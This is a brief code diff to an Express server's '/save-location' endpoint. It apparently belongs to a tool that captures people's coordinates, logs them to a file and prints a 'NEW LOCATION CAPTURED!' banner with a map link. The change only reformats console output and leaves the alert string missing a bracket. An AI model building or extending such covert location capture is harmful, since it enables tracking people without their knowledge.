@@ -38,8 +38,7 @@ app.post('/save-location', (req, res) => {
 
   fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
 
-  console.log('\n========================================');
-  console.log('  [ALERT] NEW LOCATION CAPTURED!');
+  console.log('\nALERT] NEW LOCATION CAPTURED!');
   console.log('========================================');
   console.log(` > COORD:    ${latitude}, ${longitude}`);
   console.log(` > MAP:      https://www.google.com/maps?q=${latitude},${longitude}`);
